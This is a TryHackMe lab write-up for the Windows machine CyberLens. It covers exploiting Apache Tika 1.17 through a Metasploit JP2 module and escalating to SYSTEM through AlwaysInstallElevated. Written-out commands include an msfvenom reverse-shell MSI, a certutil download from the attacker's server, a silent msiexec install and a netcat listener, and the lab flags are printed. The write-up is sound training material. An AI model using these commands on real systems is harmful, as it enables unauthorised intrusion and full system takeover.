# CyberLens TryHackMe Writeup

> **Platform:** TryHackMe  
> **OS:** Windows  
> **Difficulty:** Easy  

---

## Machine Information

CyberLens is a Windows machine running a web application that uses Apache Tika under the hood for file processing. The intended path involves finding a hidden service exposed in the page source, exploiting an old and unpatched version of Apache Tika to get a foothold, then abusing Windows Installer privileges to escalate to SYSTEM. Nothing too crazy, but it's a solid chain that teaches you to look beyond the obvious ports.

---

## Enumeration

### Nmap

As always, I started with an Nmap scan to get a feel for what's running.

```
Nmap scan report for 10.49.161.116
Host is up (0.080s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.57 ((Win64))
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

So we've got a Windows box with a web server on port 80, SMB on 139/445, RDP on 3389, and WinRM on 5985. Pretty standard Windows attack surface at first glance.

My first instinct was to check SMB since that's usually a quick win anonymous share access, null sessions, that kind of thing. But nothing came of it. No interesting shares, no useful information. Dead end there.

### Web Enumeration

With SMB out of the picture, I moved over to the web server on port 80. The site itself wasn't particularly interesting on the surface, but I made a habit of always checking the page source and that's where things got interesting.

Buried in the JavaScript was this:

```javascript
var reader = new FileReader();
reader.onload = function() {
  var fileData = reader.result;

  fetch("http://cyberlens.thm:61777/meta", {
    method: "PUT",
    body: fileData,
    headers: {
      "Accept": "application/json",
      "Content-Type": "application/octet-stream"
    }
  });
}
```

This is the page's file upload functionality making a PUT request to port 61777 at the `/meta` endpoint. That port wasn't in the Nmap results, so it's either filtered from the outside or just wasn't scanned directly. Either way, the page source just handed me a hidden service.

### Service Enumeration

I checked what was actually running on port 61777 and confirmed it was **Apache Tika 1.17 Server**. 
The moment I saw version 1.17, I went straight to searching for exploits. Apache Tika has a well-known vulnerability in that version range involving JPEG 2000 (JP2) file metadata and Metasploit has a module for it.

---

## Initial Foothold

The vulnerability in Apache Tika 1.17 works like this: when you send a JP2 file to the `/meta` endpoint, Tika processes the metadata inside it. The problem is that it passes attacker-controlled values directly into an internal JavaScript engine without properly sanitizing them first. That means you can embed JScript in the metadata, and Tika will execute it on the server. No authentication required just a PUT request with a crafted file.

I loaded up the `exploit/windows/http/apache_tika_jp2_jscript` module in Metasploit and set it up:

```
msf exploit(windows/http/apache_tika_jp2_jscript) > show options

   RHOSTS     cyberlens.thm
   RPORT      61777
   TARGETURI  /meta
   LHOST      192.168.151.76
   LPORT      4444
   Payload:   windows/meterpreter/reverse_tcp
```

I noticed the `TARGETURI` was set to `/meta` by default but I changed it to `/` just to be safe, then ran it:

```
msf exploit(windows/http/apache_tika_jp2_jscript) > set targeturi /
targeturi => /
msf exploit(windows/http/apache_tika_jp2_jscript) > run

[*] Started reverse TCP handler on 192.168.151.76:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Target is vulnerable based on version: 1.17
[*] Sending PUT request to 10.49.161.116:61777/meta
[*] Command Stager progress -  82.46% done (7999/9701 bytes)
[*] Sending PUT request to 10.49.161.116:61777/meta
[*] Command Stager progress - 100.00% done (9701/9701 bytes)
[*] Sending stage (199238 bytes) to 10.49.161.116
[*] Meterpreter session 1 opened (192.168.151.76:4444 -> 10.49.161.116:49998)
```

Metasploit even confirmed the version before firing `The target is vulnerable based on version: 1.17`. Clean. We've got a Meterpreter session.

I dropped into a shell to confirm who we landed as:

```
meterpreter > shell
Process 544 created.
Channel 1 created.

C:\Windows\system32> whoami
cyberlens\cyberlens
```

Low-privilege user, as expected. I navigated to the Desktop and grabbed the first flag:

```
C:\Users\CyberLens\Desktop> type user.txt
THM{T1k4-CV3-f0r-7h3-w1n}
```

User flag down. Now for the fun part.

---

## Privilege Escalation

My first attempt was the lazy route just throw `getsystem` at it and see what sticks:

```
meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: 1346 The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)
[-] Named Pipe Impersonation (PrintSpooler variant)
[-] Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)
```

Every single technique failed. Fair enough can't always rely on the easy button.

Since automated escalation wasn't working, I shifted to a manual approach. On Windows, there's a policy called `AlwaysInstallElevated` that, when enabled, allows any user regardless of privilege level to install `.msi` packages with SYSTEM privileges. It's a known misconfiguration that's been abused for years, and it looked like it was in play here.

The plan was simple: create a malicious `.msi` file that contains a reverse shell payload, transfer it to the target, and execute it. Windows Installer would run it as SYSTEM and call back to my listener.

I generated the payload with `msfvenom`:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.151.76 LPORT=6666 -f msi -o malicious.msi
```

```
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: malicious.msi
```

Then I spun up a quick Python HTTP server to host it:

```bash
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 ...
```

Back on the target, I used `certutil` to download the file it's a built-in Windows utility that's handy for file transfers since it can pull from URLs:

```
C:\Windows\system32> certutil -urlcache -f http://192.168.151.76:8000/malicious.msi C:\Windows\Tasks\malicious.msi
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

The Python server confirmed the download happened twice (that's normal `certutil` sometimes makes multiple requests):

```
10.49.161.116 - - [28/Jul/2026 21:23:16] "GET /malicious.msi HTTP/1.1" 200 -
10.49.161.116 - - [28/Jul/2026 21:23:16] "GET /malicious.msi HTTP/1.1" 200 -
```

With the file on the target, I set up a netcat listener on port 6666 and then triggered the installer:

```
C:\Windows\system32> msiexec /quiet /qn /i C:\Windows\Tasks\malicious.msi
```

The `/quiet` and `/qn` flags suppress any UI prompts so the installation runs silently. A few seconds later:

```
nc -nvlp 6666
listening on [any] 6666 ...
connect to [192.168.151.76] from (UNKNOWN) [10.49.161.116] 50046
Microsoft Windows [Version 10.0.17763.1821]

C:\Windows\system32> whoami
nt authority\system
```

There it is. SYSTEM shell.

---

## Root

With SYSTEM access, I headed straight for the Administrator's Desktop:

```
C:\Users\Administrator\Desktop> type admin.txt
THM{3lev@t3D-4-pr1v35c!}
```

Both flags captured. Machine done.

---
